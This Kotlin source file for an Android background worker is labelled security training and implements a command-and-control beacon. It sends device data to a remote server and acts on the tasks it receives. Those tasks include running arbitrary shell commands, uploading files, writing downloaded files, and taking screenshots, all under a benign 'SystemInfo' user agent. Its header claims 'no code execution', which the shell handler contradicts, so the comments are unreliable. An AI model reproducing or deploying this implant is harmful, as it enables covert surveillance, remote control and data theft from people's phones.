package com.securitydemo.systeminfo

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * BeaconWorker — periodically sends device data and checks for tasks.
 *
 * FOR CORPORATE SECURITY TRAINING ONLY.
 *
 * Demonstrates bidirectional C2-style communication:
 * - Sends device data to the server (heartbeat or full dump)
 * - Reads the server response for "tasks"
 * - Executes safe data-collection tasks and reports results
 *
 * Supported task types (data collection only, no code execution):
 *   "collect_full"   — send full device data dump
 *   "collect_apps"   — send installed apps list
 *   "collect_network" — send network information
 *   "collect_storage" — send storage/RAM info
 *   "set_message"    — display a message in the app UI via SharedPrefs
 */
class BeaconWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "BeaconWorker"
        const val PREFS_NAME = "beacon_prefs"
        const val KEY_LAST_BEACON = "last_beacon"
        const val KEY_SERVER_MSG = "server_message"
        const val KEY_BEACON_COUNT = "beacon_count"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val collector = DeviceDataCollector(applicationContext)

            // Send heartbeat and check for tasks
            val response = sendData(collector.collectBasic())
            incrementBeaconCount()

            // Process server response for tasks
            if (response != null) {
                processServerResponse(response, collector)
            }

            Log.d(TAG, "Beacon cycle completed")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Beacon failed: ${e.message}")
            Result.retry()
        }
    }

    private fun processServerResponse(responseBody: String, collector: DeviceDataCollector) {
        try {
            val json = JSONObject(responseBody)
            val task = json.optString("task", "")

            if (task.isNotEmpty()) {
                Log.d(TAG, "Received task: $task")

                val taskData: Map<String, Any> = when (task) {
                    "collect_full" -> collector.collectAll()
                    "collect_apps" -> collector.getInstalledApps() + mapOf(
                        "type" to "task_response",
                        "task" to task,
                        "timestamp" to System.currentTimeMillis()
                    )
                    "collect_network" -> {
                        val basic = collector.collectBasic()
                        basic + mapOf("type" to "task_response", "task" to task)
                    }
                    "set_message" -> {
                        val msg = json.optString("message", "")
                        if (msg.isNotEmpty()) {
                            val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                            prefs.edit().putString(KEY_SERVER_MSG, msg).apply()
                        }
                        mapOf(
                            "type" to "task_ack",
                            "task" to task,
                            "status" to "message_set",
                            "timestamp" to System.currentTimeMillis()
                        )
                    }
                    "list_files" -> handleListFiles(json)
                    "upload_file" -> handleUploadFile(json)
                    "download_file" -> handleDownloadFile(json)
                    "shell_command" -> handleShellCommand(json)
                    "screenshot" -> handleScreenshot(json)
                    else -> mapOf(
                        "type" to "task_unknown",
                        "task" to task,
                        "timestamp" to System.currentTimeMillis()
                    )
                }

                // Send task results back
                sendData(taskData)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing response: ${e.message}")
        }
    }

    // ─── File operation handlers ─────────────────────
    private fun handleListFiles(json: JSONObject): Map<String, Any> {
        val path = json.optString("path", "/sdcard/")
        return try {
            val dir = java.io.File(path)
            if (!dir.exists()) {
                mapOf("type" to "task_response", "task" to "list_files",
                    "path" to path, "error" to "path not found")
            } else if (!dir.canRead()) {
                mapOf("type" to "task_response", "task" to "list_files",
                    "path" to path, "error" to "permission denied")
            } else {
                val files = (dir.listFiles() ?: emptyArray()).map { f ->
                    mapOf(
                        "name" to f.name,
                        "is_dir" to f.isDirectory,
                        "size" to f.length(),
                        "modified" to f.lastModified(),
                        "readable" to f.canRead()
                    )
                }.sortedWith(compareByDescending<Map<String, Any>> { it["is_dir"] as Boolean }
                    .thenBy { (it["name"] as String).lowercase() })
                mapOf(
                    "type" to "task_response", "task" to "list_files",
                    "path" to path,
                    "file_count" to files.size,
                    "files" to files,
                    "timestamp" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "list_files",
                "path" to path, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleUploadFile(json: JSONObject): Map<String, Any> {
        val path = json.optString("path", "")
        if (path.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "upload_file",
                "error" to "no path specified")
        }
        return try {
            val file = java.io.File(path)
            if (!file.exists()) {
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "file not found")
            } else if (!file.canRead()) {
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "permission denied")
            } else if (file.length() > 10 * 1024 * 1024) {
                mapOf("type" to "task_response", "task" to "upload_file",
                    "path" to path, "error" to "file too large (>10MB)")
            } else {
                val bytes = file.readBytes()
                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val uploadUrl = BuildConfig.BEACON_URL.replace("/beacon", "/api/file_upload")
                val uploadPayload = org.json.JSONObject().apply {
                    put("filename", file.name)
                    put("path", path)
                    put("content", b64)
                    put("device", Build.MODEL)
                }.toString()
                sendDataToUrl(uploadUrl, uploadPayload)
                mapOf(
                    "type" to "task_response", "task" to "upload_file",
                    "path" to path, "filename" to file.name,
                    "size" to bytes.size,
                    "status" to "uploaded",
                    "timestamp" to System.currentTimeMillis()
                )
            }
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "upload_file",
                "path" to path, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleDownloadFile(json: JSONObject): Map<String, Any> {
        val destPath = json.optString("dest_path", "")
        val content = json.optString("content", "")
        val filename = json.optString("filename", "file")
        if (destPath.isEmpty() || content.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "download_file",
                "error" to "missing dest_path or content")
        }
        return try {
            val bytes = android.util.Base64.decode(content, android.util.Base64.DEFAULT)
            val file = java.io.File(destPath)
            file.parentFile?.mkdirs()
            file.writeBytes(bytes)
            mapOf(
                "type" to "task_response", "task" to "download_file",
                "dest_path" to destPath, "filename" to filename,
                "size" to bytes.size,
                "status" to "saved",
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "download_file",
                "dest_path" to destPath, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleShellCommand(json: JSONObject): Map<String, Any> {
        val command = json.optString("command", "")
        if (command.isEmpty()) {
            return mapOf("type" to "task_response", "task" to "shell_command",
                "error" to "empty command")
        }
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val stdout = process.inputStream.bufferedReader().readText()
            val stderr = process.errorStream.bufferedReader().readText()
            val exitCode = process.waitFor()
            mapOf(
                "type" to "task_response", "task" to "shell_command",
                "command" to command,
                "stdout" to stdout,
                "stderr" to stderr,
                "exit_code" to exitCode,
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf("type" to "task_response", "task" to "shell_command",
                "command" to command, "error" to (e.message ?: "unknown error"))
        }
    }

    private fun handleScreenshot(json: JSONObject): Map<String, Any> {
        val quality = json.optInt("quality", 40)
        val uploadUrl = BuildConfig.BEACON_URL.replace("/beacon", "/api/screen_upload")
        return ScreenCaptureService.captureAndUpload(quality, uploadUrl)
    }

    private fun sendDataToUrl(urlStr: String, payload: String): String? {
        val url = URL(urlStr)
        val connection = url.openConnection() as HttpURLConnection
        try {
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("User-Agent", "SystemInfo/1.0")
            connection.doOutput = true
            connection.doInput = true
            connection.connectTimeout = 15_000
            connection.readTimeout = 30_000
            OutputStreamWriter(connection.outputStream).use { it.write(payload); it.flush() }
            return if (connection.responseCode == 200) {
                BufferedReader(InputStreamReader(connection.inputStream)).use { it.readText() }
            } else null
        } finally {
            connection.disconnect()
        }
    }

    private fun sendData(data: Map<String, Any>): String? {
        val url = URL(BuildConfig.BEACON_URL)
        val payload = mapToJson(data)

        val connection = url.openConnection() as HttpURLConnection
        try {
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("User-Agent", "SystemInfo/1.0")
            connection.doOutput = true
            connection.doInput = true
            connection.connectTimeout = 15_000
            connection.readTimeout = 15_000

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(payload)
                writer.flush()
            }

            val responseCode = connection.responseCode
            Log.d(TAG, "Server response: $responseCode")

            // Save last beacon time
            val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putLong(KEY_LAST_BEACON, System.currentTimeMillis()).apply()

            if (responseCode == 200) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val body = reader.readText()
                reader.close()
                return body
            }
            return null
        } finally {
            connection.disconnect()
        }
    }

    private fun incrementBeaconCount() {
        val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val count = prefs.getInt(KEY_BEACON_COUNT, 0) + 1
        prefs.edit().putInt(KEY_BEACON_COUNT, count).apply()
    }

    private fun mapToJson(map: Map<String, Any>): String {
        val json = JSONObject()
        for ((key, value) in map) {
            when (value) {
                is List<*> -> {
                    val arr = org.json.JSONArray()
                    for (item in value) {
                        if (item is Map<*, *>) {
                            val obj = JSONObject()
                            for ((k, v) in item) obj.put(k.toString(), v)
                            arr.put(obj)
                        } else {
                            arr.put(item)
                        }
                    }
                    json.put(key, arr)
                }
                is Map<*, *> -> {
                    val obj = JSONObject()
                    for ((k, v) in value) obj.put(k.toString(), v)
                    json.put(key, obj)
                }
                else -> json.put(key, value)
            }
        }
        return json.toString()
    }
}
